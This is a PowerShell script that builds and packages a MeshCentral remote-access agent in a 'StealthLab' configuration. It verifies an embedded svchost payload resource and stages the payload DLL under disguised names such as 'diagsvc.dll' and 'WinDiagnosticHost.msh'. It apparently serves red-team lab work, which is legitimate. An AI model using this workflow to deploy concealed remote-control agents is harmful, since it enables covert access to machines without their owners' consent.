[CmdletBinding()]
param(
    [string]$OutputDir = "..\dist\meshcentral",
    [switch]$SkipBuild,
    [switch]$IncludeWin32
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$repoRoot = Split-Path -Parent $scriptRoot

. (Join-Path $scriptRoot 'ResourceProbe.ps1')

function Resolve-OutputPath {
    param([string]$Path)

    if ([System.IO.Path]::IsPathRooted($Path)) {
        return [System.IO.Path]::GetFullPath($Path)
    }

    return [System.IO.Path]::GetFullPath((Join-Path $repoRoot $Path))
}

if (-not $SkipBuild) {
    Write-Host "[1/4] Building StealthLab configuration..." -ForegroundColor Cyan
    & (Join-Path $repoRoot "build.ps1") -StealthLab -SkipTests
    if ($LASTEXITCODE -ne 0) {
        throw "build.ps1 exited with code $LASTEXITCODE"
    }
} else {
    Write-Host "[1/4] Skipping build (per parameter)" -ForegroundColor Yellow
}

$exeX64 = Join-Path $repoRoot "meshservice\x64\StealthLab\MeshService-2022.exe"
$exeWin32 = Join-Path $repoRoot "meshservice\StealthLab\MeshService-2022.exe"
$dllPayload = Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
$embeddedPayload = Join-Path $repoRoot "meshservice\embedded\svchost_payload.dll"
$mshPath = Join-Path $repoRoot "WinDiagnosticHost.msh"
$brandingConfig = Join-Path $repoRoot "branding_config.json"

if (-not (Test-Path $exeX64)) {
    throw "Expected x64 StealthLab executable not found at '$exeX64'."
}

if (-not (Test-SvchostPayload -Path $exeX64)) {
    throw "Issued build does not contain SVCHOSTDLL payload resource: $exeX64"
}

$outputRoot = Resolve-OutputPath -Path $OutputDir
New-Item -ItemType Directory -Force -Path $outputRoot | Out-Null

Write-Host "[2/4] Staging artifacts into $outputRoot" -ForegroundColor Cyan

$artifacts = @()
$hashLines = @()

function Copy-WithHash {
    param(
        [string]$Source,
        [string]$DestinationName,
        [string]$Description
    )

    if (-not (Test-Path $Source)) {
        return $null
    }

    $destPath = Join-Path $outputRoot $DestinationName
    Copy-Item -Path $Source -Destination $destPath -Force
    $hash = (Get-FileHash -Path $destPath -Algorithm SHA256).Hash

    return [PSCustomObject]@{
        Name = $DestinationName
        Source = $Source
        Hash = $hash
        Description = $Description
    }
}

$artifact = Copy-WithHash -Source $exeX64 -DestinationName "MeshService64.exe" -Description "StealthLab svchost-hosted executable"
if ($artifact) {
    $artifacts += $artifact
    $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)"
}

if ($IncludeWin32 -and (Test-Path $exeWin32)) {
    if (-not (Test-SvchostPayload -Path $exeWin32)) {
        throw "Win32 StealthLab executable is missing embedded payload: $exeWin32"
    }
    $artifact = Copy-WithHash -Source $exeWin32 -DestinationName "MeshService.exe" -Description "StealthLab Win32 executable"
    if ($artifact) {
        $artifacts += $artifact
        $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)"
    }
}

$artifact = Copy-WithHash -Source $dllPayload -DestinationName "diagsvc.dll" -Description "svchost payload DLL (StealthLab_DLL)"
if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
$artifact = Copy-WithHash -Source $embeddedPayload -DestinationName "svchost_payload.dll" -Description "Staged embedded payload for diagnostics"
if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
$artifact = Copy-WithHash -Source $mshPath -DestinationName "WinDiagnosticHost.msh" -Description "Provisioning data (.msh)"
if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
$artifact = Copy-WithHash -Source $brandingConfig -DestinationName "branding_config.json" -Description "Branding configuration snapshot"
if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }

Write-Host "[3/4] Writing metadata..." -ForegroundColor Cyan

$hashFile = Join-Path $outputRoot "checksums.txt"
$hashLines | Out-File -FilePath $hashFile -Encoding UTF8

$readmePath = Join-Path $outputRoot "README.txt"
$readme = @"
MeshAgent MeshCentral Deployment Package
========================================

Generated : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Source    : $repoRoot

Contents
--------
$(($artifacts | ForEach-Object { "  - {0,-22} {1}" -f $_.Name, $_.Description }) -join [Environment]::NewLine)

Deployment Steps
----------------
1. Copy 'MeshService64.exe' to your MeshCentral agents override directory (typically meshcentral-data\agents).
2. Restart the MeshCentral service.
3. Download the Windows x64 agent from the portal and verify the SVCHOSTDLL resource is present.

Verification
------------
Checksums are recorded in checksums.txt. Re-run Test-SvchostPayload for the published executable if required.
"@
$readme | Out-File -FilePath $readmePath -Encoding UTF8

Write-Host "[4/4] Package ready." -ForegroundColor Green
Write-Host ""
Write-Host ("Artifacts staged in: {0}" -f $outputRoot) -ForegroundColor Cyan
foreach ($item in $artifacts) {
    Write-Host ("  - {0}  SHA256 {1}" -f $item.Name, $item.Hash.Substring(0, 16)) -ForegroundColor Gray
}
Write-Host ""
